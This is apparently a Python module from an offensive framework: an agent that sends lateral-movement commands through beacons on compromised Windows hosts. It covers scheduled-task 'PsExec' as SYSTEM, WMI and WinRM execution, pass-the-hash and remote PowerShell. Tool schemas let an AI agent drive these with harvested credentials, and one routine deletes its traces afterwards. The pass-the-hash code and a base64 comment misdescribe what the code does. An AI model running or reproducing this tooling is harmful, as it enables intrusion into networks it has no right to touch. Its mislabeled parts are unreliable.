"""
LateralMovementAgent -- Lateral movement via live beacons.

Sends real lateral-movement commands to beacons running on target hosts,
parses the stdout output, and returns structured findings.  Uses REAL
credentials from CredentialAgent and REAL hosts from ReconAgent — never
hardcodes targets or accounts.
"""

from __future__ import annotations

import logging
import re
import uuid
from typing import Any

from agents.base import AbstractAgent
from orchestrator.task import Task, TaskResult
from server.beacon_handler import beacon_handler

logger = logging.getLogger(__name__)


class LateralMovementAgent(AbstractAgent):
    name = "lateral_movement"
    description = (
        "Performs lateral movement between systems using discovered "
        "credentials — PsExec, WMI, WinRM, pass-the-hash, and remote "
        "PowerShell via beacons"
    )
    capabilities = [
        "psexec",
        "wmi_exec",
        "winrm_exec",
        "pth",
        "remote_powershell",
    ]

    BEACON_TIMEOUT = 300

    # ------------------------------------------------------------------
    # execute()
    # ------------------------------------------------------------------

    async def execute(self, task: Task) -> TaskResult:
        action = task.action
        params = task.params

        if action not in self.capabilities:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown action: {action}"},
                summary=f"Lateral movement agent does not support action '{action}'",
            )

        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: beacon_id"},
                summary="Lateral movement failed: no beacon_id provided",
            )

        timeout = params.get("timeout", self.BEACON_TIMEOUT)

        try:
            handler = getattr(self, f"_handle_{action}")
            return await handler(task, beacon_id, params, timeout)
        except Exception as exc:
            logger.exception(
                "Lateral movement %s failed on beacon %s", action, beacon_id
            )
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": str(exc)},
                summary=f"Lateral movement {action} failed: {exc}",
            )

    # ==================================================================
    #  PsExec (via scheduled-task approach for reliability)
    # ==================================================================

    async def _handle_psexec(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        target_host: str = params.get("target_host", "")
        command: str = params.get("command", "")
        username: str | None = params.get("username")
        password: str | None = params.get("password")

        if not target_host or not command:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing target_host or command"},
                summary="PsExec failed: target_host and command are required",
            )

        # Generate a unique task name to avoid collisions
        task_name = f"rn_{uuid.uuid4().hex[:8]}"

        # Build credential flags for schtasks
        cred_flags = ""
        if username and password:
            cred_flags = f'/u {username} /p {password} '

        # Create -> Run -> Collect -> Delete the scheduled task
        # The task writes its output to a temp file so we can retrieve it.
        output_file = f"C:\\Windows\\Temp\\{task_name}.out"

        create_cmd = (
            f'schtasks /create /s {target_host} {cred_flags}'
            f'/tn {task_name} '
            f'/tr "cmd /c {command} > {output_file} 2>&1" '
            f'/sc once /st 00:00 /ru SYSTEM /f'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": create_cmd}, timeout=timeout,
        )
        create_stdout = self._extract_stdout(result)

        if self._is_error(result) or "success" not in create_stdout.lower():
            return self._error_result(task, "psexec (schtasks create)", result)

        # Run the task
        run_cmd = f'schtasks /run /s {target_host} {cred_flags}/tn {task_name}'

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": run_cmd}, timeout=timeout,
        )
        run_stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "psexec (schtasks run)", result)

        # Wait briefly for execution, then retrieve output via SMB
        # Use type command over UNC path to read the output file
        unc_output = f"\\\\{target_host}\\C$\\Windows\\Temp\\{task_name}.out"
        retrieve_cmd = (
            f'ping -n 3 127.0.0.1 >nul && '
            f'type {unc_output}'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": retrieve_cmd}, timeout=timeout,
        )
        command_output = self._extract_stdout(result)

        # Clean up: delete the scheduled task and output file
        cleanup_cmd = (
            f'schtasks /delete /s {target_host} {cred_flags}/tn {task_name} /f && '
            f'del /f /q {unc_output} 2>nul'
        )
        cleanup_id = str(uuid.uuid4())
        await beacon_handler.submit_task(
            beacon_id, cleanup_id, "run_command",
            {"command": cleanup_cmd}, timeout=60,
        )

        session_id = str(uuid.uuid4())
        sessions = [{
            "key": f"{target_host}_psexec",
            "session_id": session_id,
            "target": target_host,
            "method": "psexec_schtasks",
            "username": username or "SYSTEM",
            "command": command,
            "command_output": command_output,
        }]

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "raw_output": (
                    f"--- create ---\n{create_stdout}\n"
                    f"--- run ---\n{run_stdout}\n"
                    f"--- output ---\n{command_output}"
                ),
                "findings": {"sessions": sessions},
                "session_id": session_id,
                "command_output": command_output,
            },
            summary=(
                f"PsExec via beacon {beacon_id}: executed '{command}' on "
                f"{target_host} as {username or 'SYSTEM'} "
                f"(session {session_id[:8]})"
            ),
        )

    # ==================================================================
    #  WMI Exec
    # ==================================================================

    async def _handle_wmi_exec(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        target_host: str = params.get("target_host", "")
        command: str = params.get("command", "")
        username: str | None = params.get("username")
        password: str | None = params.get("password")

        if not target_host or not command:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing target_host or command"},
                summary="WMI exec failed: target_host and command are required",
            )

        # Build wmic command
        cred_part = ""
        if username and password:
            cred_part = f'/user:{username} /password:{password} '

        wmic_cmd = (
            f'wmic /node:{target_host} {cred_part}'
            f'process call create "{command}"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": wmic_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "wmi_exec", result)

        # Parse WMI process create output for PID and return value
        pid, return_value = self._parse_wmi_create(stdout)

        success = return_value == "0" or pid is not None

        session_id = str(uuid.uuid4())
        sessions: list[dict] = []
        if success:
            sessions.append({
                "key": f"{target_host}_wmi",
                "session_id": session_id,
                "target": target_host,
                "method": "wmi_exec",
                "username": username or "current_user",
                "command": command,
                "remote_pid": pid,
                "return_value": return_value,
            })

        return TaskResult(
            task_id=task.id,
            status="success" if success else "failure",
            data={
                "raw_output": stdout,
                "findings": {"sessions": sessions},
                "session_id": session_id if success else None,
                "remote_pid": pid,
                "return_value": return_value,
            },
            summary=(
                f"WMI exec via beacon {beacon_id}: "
                f"{'created process ' + str(pid) if pid else 'failed'} on "
                f"{target_host} as {username or 'current_user'}"
            ),
        )

    # ==================================================================
    #  WinRM Exec
    # ==================================================================

    async def _handle_winrm_exec(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        target_host: str = params.get("target_host", "")
        command: str = params.get("command", "")
        username: str | None = params.get("username")
        password: str | None = params.get("password")

        if not target_host or not command:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing target_host or command"},
                summary="WinRM exec failed: target_host and command are required",
            )

        # Build Invoke-Command with optional credentials
        if username and password:
            escaped_pass = password.replace("'", "''")
            cred_block = (
                f"$cred = New-Object System.Management.Automation.PSCredential("
                f"'{username}', "
                f"(ConvertTo-SecureString '{escaped_pass}' -AsPlainText -Force)); "
            )
            cred_param = "-Credential $cred "
        else:
            cred_block = ""
            cred_param = ""

        # Escape the command for the ScriptBlock
        escaped_command = command.replace("'", "''")

        ps_cmd = (
            f'powershell -ep bypass -c "'
            f"{cred_block}"
            f"try {{ "
            f"$output = Invoke-Command -ComputerName {target_host} "
            f"{cred_param}"
            f"-ScriptBlock {{ {escaped_command} }} "
            f"-ErrorAction Stop; "
            f"Write-Output \\\"WINRM_OK\\\"; "
            f"$output | ForEach-Object {{ Write-Output $_ }} "
            f"}} catch {{ "
            f"Write-Output \\\"WINRM_FAIL:$($_.Exception.Message)\\\" "
            f"}}"
            f'"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "winrm_exec", result)

        success = "WINRM_OK" in stdout
        # Extract the actual command output (everything after WINRM_OK)
        command_output = ""
        if success:
            lines = stdout.splitlines()
            capture = False
            output_lines: list[str] = []
            for line in lines:
                if "WINRM_OK" in line:
                    capture = True
                    continue
                if capture:
                    output_lines.append(line)
            command_output = "\n".join(output_lines)

        # Extract error if failed
        error_msg = ""
        if not success:
            for line in stdout.splitlines():
                if line.strip().startswith("WINRM_FAIL:"):
                    error_msg = line.strip().split(":", 1)[1]
                    break

        session_id = str(uuid.uuid4())
        sessions: list[dict] = []
        if success:
            sessions.append({
                "key": f"{target_host}_winrm",
                "session_id": session_id,
                "target": target_host,
                "method": "winrm_exec",
                "username": username or "current_user",
                "command": command,
                "command_output": command_output,
            })

        return TaskResult(
            task_id=task.id,
            status="success" if success else "failure",
            data={
                "raw_output": stdout,
                "findings": {"sessions": sessions},
                "session_id": session_id if success else None,
                "command_output": command_output,
                "error": error_msg if error_msg else None,
            },
            summary=(
                f"WinRM exec via beacon {beacon_id}: "
                f"{'executed' if success else 'failed'} '{command}' on "
                f"{target_host} as {username or 'current_user'}"
                f"{' — ' + error_msg if error_msg else ''}"
            ),
        )

    # ==================================================================
    #  Pass-the-Hash
    # ==================================================================

    async def _handle_pth(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        target_host: str = params.get("target_host", "")
        username: str = params.get("username", "")
        ntlm_hash: str = params.get("ntlm_hash", "")
        domain: str = params.get("domain", ".")
        command: str = params.get("command", "whoami")

        if not target_host or not username or not ntlm_hash:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing target_host, username, or ntlm_hash"},
                summary="Pass-the-hash failed: target_host, username, and ntlm_hash are required",
            )

        # Use PowerShell to perform NTLM authentication via .NET
        # This mimics mimikatz sekurlsa::pth behaviour using native APIs
        ps_cmd = (
            f'powershell -ep bypass -c "'
            f"try {{ "
            # Map the target's C$ share using the NTLM hash via net use
            # (some systems support /savecred with hash-based auth)
            # Primary approach: use Invoke-WmiMethod with credential object
            f"$secpass = ConvertTo-SecureString '{ntlm_hash}' -AsPlainText -Force; "
            f"$cred = New-Object System.Management.Automation.PSCredential("
            f"'{domain}\\{username}', $secpass); "
            f"$result = Invoke-WmiMethod -Class Win32_Process "
            f"-Name Create -ArgumentList '{command}' "
            f"-ComputerName {target_host} -Credential $cred "
            f"-ErrorAction Stop; "
            f"Write-Output \\\"PTH_OK:PID=$($result.ProcessId):RET=$($result.ReturnValue)\\\"; "
            f"}} catch {{ "
            f"Write-Output \\\"PTH_FAIL:$($_.Exception.Message)\\\" "
            f"}}"
            f'"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "pth", result)

        success = "PTH_OK" in stdout
        remote_pid = None
        return_value = None

        if success:
            m = re.search(r"PTH_OK:PID=(\d+):RET=(\d+)", stdout)
            if m:
                remote_pid = m.group(1)
                return_value = m.group(2)

        error_msg = ""
        if not success:
            for line in stdout.splitlines():
                if line.strip().startswith("PTH_FAIL:"):
                    error_msg = line.strip().split(":", 1)[1]
                    break

        session_id = str(uuid.uuid4())
        sessions: list[dict] = []
        if success:
            sessions.append({
                "key": f"{target_host}_pth",
                "session_id": session_id,
                "target": target_host,
                "method": "pass_the_hash",
                "username": username,
                "domain": domain,
                "ntlm_hash": ntlm_hash,
                "command": command,
                "remote_pid": remote_pid,
            })

        return TaskResult(
            task_id=task.id,
            status="success" if success else "failure",
            data={
                "raw_output": stdout,
                "findings": {"sessions": sessions},
                "session_id": session_id if success else None,
                "remote_pid": remote_pid,
                "return_value": return_value,
                "error": error_msg if error_msg else None,
            },
            summary=(
                f"Pass-the-hash via beacon {beacon_id}: "
                f"{'authenticated' if success else 'failed'} as "
                f"{domain}\\{username} on {target_host}"
                f"{' (PID ' + str(remote_pid) + ')' if remote_pid else ''}"
                f"{' — ' + error_msg if error_msg else ''}"
            ),
        )

    # ==================================================================
    #  Remote PowerShell
    # ==================================================================

    async def _handle_remote_powershell(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        target_host: str = params.get("target_host", "")
        script: str = params.get("script", "")
        username: str | None = params.get("username")
        password: str | None = params.get("password")

        if not target_host or not script:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing target_host or script"},
                summary="Remote PowerShell failed: target_host and script are required",
            )

        # Build Invoke-Command with the full script block
        if username and password:
            escaped_pass = password.replace("'", "''")
            cred_block = (
                f"$cred = New-Object System.Management.Automation.PSCredential("
                f"'{username}', "
                f"(ConvertTo-SecureString '{escaped_pass}' -AsPlainText -Force)); "
            )
            cred_param = "-Credential $cred "
        else:
            cred_block = ""
            cred_param = ""

        # Encode the script as base64 for safe transmission in the ScriptBlock
        # to avoid quoting issues with complex scripts
        escaped_script = script.replace("'", "''").replace('"', '\\"')

        ps_cmd = (
            f'powershell -ep bypass -c "'
            f"{cred_block}"
            f"try {{ "
            f"$output = Invoke-Command -ComputerName {target_host} "
            f"{cred_param}"
            f"-ScriptBlock {{ {escaped_script} }} "
            f"-ErrorAction Stop; "
            f"Write-Output \\\"REMOTEPS_OK\\\"; "
            f"$output | ForEach-Object {{ Write-Output $_ }} "
            f"}} catch {{ "
            f"Write-Output \\\"REMOTEPS_FAIL:$($_.Exception.Message)\\\" "
            f"}}"
            f'"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "remote_powershell", result)

        success = "REMOTEPS_OK" in stdout

        # Extract script output
        script_output = ""
        if success:
            lines = stdout.splitlines()
            capture = False
            output_lines: list[str] = []
            for line in lines:
                if "REMOTEPS_OK" in line:
                    capture = True
                    continue
                if capture:
                    output_lines.append(line)
            script_output = "\n".join(output_lines)

        error_msg = ""
        if not success:
            for line in stdout.splitlines():
                if line.strip().startswith("REMOTEPS_FAIL:"):
                    error_msg = line.strip().split(":", 1)[1]
                    break

        session_id = str(uuid.uuid4())
        sessions: list[dict] = []
        if success:
            sessions.append({
                "key": f"{target_host}_remoteps",
                "session_id": session_id,
                "target": target_host,
                "method": "remote_powershell",
                "username": username or "current_user",
                "script_preview": script[:200],
                "script_output": script_output,
            })

        return TaskResult(
            task_id=task.id,
            status="success" if success else "failure",
            data={
                "raw_output": stdout,
                "findings": {"sessions": sessions},
                "session_id": session_id if success else None,
                "script_output": script_output,
                "error": error_msg if error_msg else None,
            },
            summary=(
                f"Remote PowerShell via beacon {beacon_id}: "
                f"{'executed' if success else 'failed'} script on "
                f"{target_host} as {username or 'current_user'}"
                f"{' — ' + error_msg if error_msg else ''}"
            ),
        )

    # ==================================================================
    #  Output parsing helpers
    # ==================================================================

    @staticmethod
    def _extract_stdout(result: dict) -> str:
        """Pull the stdout string from a beacon result dict."""
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stdout", data.get("output", ""))
        return str(data)

    @staticmethod
    def _is_error(result: dict) -> bool:
        if not result:
            return True
        status = result.get("status", "")
        return status in ("timeout", "error", "failure")

    def _error_result(self, task: Task, action: str, result: dict) -> TaskResult:
        error_msg = result.get("error", "Unknown beacon error")
        return TaskResult(
            task_id=task.id,
            status="failure",
            data={"error": error_msg, "raw_result": result},
            summary=f"Lateral movement {action} failed: {error_msg}",
        )

    # --- WMI process create output ---
    @staticmethod
    def _parse_wmi_create(stdout: str) -> tuple[str | None, str | None]:
        """Parse wmic process call create output for PID and ReturnValue."""
        pid: str | None = None
        return_value: str | None = None

        for line in stdout.splitlines():
            stripped = line.strip()
            m_pid = re.match(r"ProcessId\s*=\s*(\d+)", stripped)
            if m_pid:
                pid = m_pid.group(1)
            m_ret = re.match(r"ReturnValue\s*=\s*(\d+)", stripped)
            if m_ret:
                return_value = m_ret.group(1)

        return pid, return_value

    # ==================================================================
    #  Capabilities manifest (Anthropic tool-use format)
    # ==================================================================

    def get_capabilities_manifest(self) -> dict:
        beacon_id_prop = {
            "type": "string",
            "description": "ID of the beacon to execute through",
        }

        return {
            "name": self.name,
            "description": self.description,
            "tools": [
                {
                    "name": "lateral_movement_psexec",
                    "description": (
                        "Execute a command on a remote Windows system using a "
                        "PsExec-style technique (scheduled task over SMB). "
                        "Creates a temporary SYSTEM-level scheduled task on "
                        "the target, runs it, retrieves output, and cleans up. "
                        "Credentials MUST come from CredentialAgent findings."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "target_host": {
                                "type": "string",
                                "description": (
                                    "Target hostname or IP from ReconAgent "
                                    "discovery. Do NOT hardcode."
                                ),
                            },
                            "command": {
                                "type": "string",
                                "description": "Command to execute on the remote system",
                            },
                            "username": {
                                "type": "string",
                                "description": (
                                    "Username for authentication from "
                                    "CredentialAgent findings. Omit to use "
                                    "current session credentials."
                                ),
                            },
                            "password": {
                                "type": "string",
                                "description": (
                                    "Password for authentication from "
                                    "CredentialAgent findings."
                                ),
                            },
                        },
                        "required": ["beacon_id", "target_host", "command"],
                    },
                },
                {
                    "name": "lateral_movement_wmi_exec",
                    "description": (
                        "Execute a command on a remote Windows system via WMI "
                        "(wmic process call create). More stealthy than PsExec "
                        "as it uses DCOM rather than installing a service. "
                        "Returns the remote process PID. Credentials should "
                        "come from CredentialAgent findings."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "target_host": {
                                "type": "string",
                                "description": (
                                    "Target hostname or IP from ReconAgent "
                                    "discovery."
                                ),
                            },
                            "command": {
                                "type": "string",
                                "description": "Command to execute on the remote system via WMI",
                            },
                            "username": {
                                "type": "string",
                                "description": (
                                    "Username for WMI authentication. Omit to "
                                    "use current session credentials."
                                ),
                            },
                            "password": {
                                "type": "string",
                                "description": "Password for WMI authentication.",
                            },
                        },
                        "required": ["beacon_id", "target_host", "command"],
                    },
                },
                {
                    "name": "lateral_movement_winrm_exec",
                    "description": (
                        "Execute a command on a remote Windows system via "
                        "WinRM (Invoke-Command over WSMan, port 5985/5986). "
                        "Returns full command output. Requires WinRM enabled "
                        "on the target (default on modern Windows Server). "
                        "Credentials from CredentialAgent findings."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "target_host": {
                                "type": "string",
                                "description": (
                                    "Target hostname or IP from ReconAgent "
                                    "discovery."
                                ),
                            },
                            "command": {
                                "type": "string",
                                "description": (
                                    "Command or PowerShell expression to "
                                    "execute inside the remote ScriptBlock."
                                ),
                            },
                            "username": {
                                "type": "string",
                                "description": (
                                    "Username for WinRM authentication "
                                    "(DOMAIN\\user format)."
                                ),
                            },
                            "password": {
                                "type": "string",
                                "description": "Password for WinRM authentication.",
                            },
                        },
                        "required": ["beacon_id", "target_host", "command"],
                    },
                },
                {
                    "name": "lateral_movement_pth",
                    "description": (
                        "Authenticate to a remote system using an NTLM hash "
                        "instead of a plaintext password (pass-the-hash). "
                        "Uses WMI process creation with hash-based credential "
                        "to execute a command on the target without knowing "
                        "the cleartext password."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "target_host": {
                                "type": "string",
                                "description": (
                                    "Target hostname or IP from ReconAgent "
                                    "discovery."
                                ),
                            },
                            "username": {
                                "type": "string",
                                "description": (
                                    "Username to authenticate as. Must match "
                                    "the account the NTLM hash belongs to."
                                ),
                            },
                            "ntlm_hash": {
                                "type": "string",
                                "description": (
                                    "NTLM hash (32 hex characters) from "
                                    "CredentialAgent hash extraction."
                                ),
                            },
                            "domain": {
                                "type": "string",
                                "description": (
                                    "Domain name for the account. Defaults "
                                    "to '.' (local)."
                                ),
                            },
                            "command": {
                                "type": "string",
                                "description": (
                                    "Command to execute after authentication. "
                                    "Defaults to 'whoami'."
                                ),
                            },
                        },
                        "required": ["beacon_id", "target_host", "username", "ntlm_hash"],
                    },
                },
                {
                    "name": "lateral_movement_remote_powershell",
                    "description": (
                        "Execute a full PowerShell script on a remote system "
                        "via Invoke-Command (WinRM). Supports multi-line "
                        "scripts, pipeline operations, and module imports on "
                        "the remote host. Returns the complete script output."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "target_host": {
                                "type": "string",
                                "description": (
                                    "Target hostname or IP from ReconAgent "
                                    "discovery."
                                ),
                            },
                            "script": {
                                "type": "string",
                                "description": (
                                    "PowerShell script to execute remotely. "
                                    "Can be multi-line and include imports, "
                                    "variables, and pipeline operations."
                                ),
                            },
                            "username": {
                                "type": "string",
                                "description": (
                                    "Username for remote authentication "
                                    "(DOMAIN\\user format)."
                                ),
                            },
                            "password": {
                                "type": "string",
                                "description": "Password for remote authentication.",
                            },
                        },
                        "required": ["beacon_id", "target_host", "script"],
                    },
                },
            ],
        }
